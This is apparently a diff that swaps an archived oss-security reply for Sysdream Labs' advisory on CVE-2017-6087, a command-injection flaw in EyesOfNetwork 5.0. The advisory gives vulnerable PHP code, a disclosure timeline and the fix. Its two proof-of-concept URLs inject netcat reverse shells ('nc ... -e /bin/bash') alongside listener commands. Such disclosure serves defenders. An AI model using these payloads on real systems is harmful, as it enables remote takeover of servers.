@@ -1,37 +1,152 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/19/5
-Message-ID: <20170419112247.GC19075@suse.de>
-Date: Wed, 19 Apr 2017 13:22:47 +0200
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/23/5
+Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
+Date: Thu, 23 Mar 2017 16:21:31 +0100
+From: Sydream Labs <labs@...dream.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Re: CVE-2017-7874 versus CVE-2009-1185 ?
+Subject: [CVE-2017-6087] EON 5.0 Remote Code Execution
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Apr 19, 2017 at 11:21:24AM +0200, Sebastian Krahmer wrote:
-> Hi
-> 
-> 
-> I stumbled across https://twitter.com/info_dox/status/854372066228932609
-> that is curious about an udev+kernel exploit
-> (https://packetstormsecurity.com/files/142152/Linux-Kernel-4.8.0-udev-232-Privilege-Escalation.html)
-> 
-> which claims to exploit a missing sender-check within udev. That makes
-> me wonder, as kernel 4.8.0 (and even earlier) no longer allow users
-> to send NETLINK_KOBJECT_UEVENT messages. Our testcases fail,
-> as they should:
-> 
-> https://bugzilla.suse.com/show_bug.cgi?id=1034330
-> 
-> 
-> However, MITRE apparently assigned a valid CVE for it:
-> 
-> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7874
-> 
-> So either we miss some weird corner case or the CVE is invalid
-> and should be withdrawn?
+# [CVE-2017-6087] EON 5.0 Remote Code Execution
 
-I think the reporter is incorrect and it should be retracted. I tried emailing 
-him, but got no reply on this issue so far.
+## Description
 
-Ciao, Marcus
+EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
+
+## Remote Code Execution (authenticated)
+
+The Eonweb code does not correctly filter arguments, allowing
+authenticated users to execute arbitrary code.
+
+**CVE ID**: CVE-2017-6087
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-78
+
+**CVSS Base Score**: 7.6
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+
+
+### Proof of Concept 1
+
+On the attacker's host, we start a handler:
+
+```
+nc -lvp 1337
+```
+
+The `selected_events` parameter is not correctly filtered before it is
+used by the `shell_exec()` function.
+
+There, it is possible to inject a payload like in the request below,
+where we connect back to our handler:
+
+```
+https://eonweb.local/module/monitoring_ged/ged_actions.php?queue=history&action=confirm&global_action=4&selected_events%5B%5D=;nc%2010.0.5.124%201337%20-e%20/bin/bash;
+```
+
+#### Vulnerable code
+
+The payload gets injected into the `$event[$key]` and `$ged_command`
+variables of the `module/monitoring_ged/ged_functions.php` file, line 373:
+
+```
+$ged_command = "-update -type $ged_type_nbr ";
+foreach ($array_ged_packets as $key => $value) {
+  if($value["type"] == true){
+    if($key == "owner"){
+      $event[$key] = $owner;
+    }
+    $ged_command .= "\"".$event[$key]."\" ";
+  }
+}
+$ged_command = trim($ged_command, " ");
+shell_exec($path_ged_bin." ".$ged_command);
+```
+
+Two other functions in this file are also affected by this problem:
+
+* `delete($selected_events, $queue);`
+* `ownDisown($selected_events, $queue, $global_action);`
+
+
+### Proof of Concept 2
+
+On the attacker's host, we start a handler:
+
+```
+nc -lvp 1337
+```
+
+The `module` parameter is not correctly filtered before it is used by
+the `shell_exec()` function.
+
+Again, we inject our connecting back payload:
+
+```
+https://eonweb.local/module/index.php?module=|nc%20192.168.1.14%201337%20-e%20/bin/bash&link=padding
+```
+
+#### Vulnerable code
+
+In the `module/index.php` file, line 24, we can see that our payload is
+injected into the `exec()` function without any sanitization:
+
+```
+# Check optionnal module to load
+if(isset($_GET["module"]) && isset($_GET["link"])) {
+
+	$module=exec("rpm -q ".$_GET["module"]." |grep '.eon' |wc -l");
+
+	# Redirect to module page if rpm installed
+	if($module!=0) { header('Location: '.$_GET["link"].''); }
+
+}
+```
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/10/2016 : Initial discovery.
+* 09/10/2016 : Fisrt contact with vendor.
+* 23/10/2016 : Technical details sent to the security contact.
+* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
+* 11/10/2016 : Testing the patch revealed that it needed more work.
+* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
+* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
+repsonsible disclosure agreement.
+* 14/03/2017 : Public disclosure.
+
+Thank you to EON for the fast response.
+
+## Solution
+
+Update to version 5.1
+
+## Affected versions
+
+* Version <= 5.0
+
+## Credits
+
+* Nicolas SERRA <n.serra@...dream.com>
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (848 bytes)
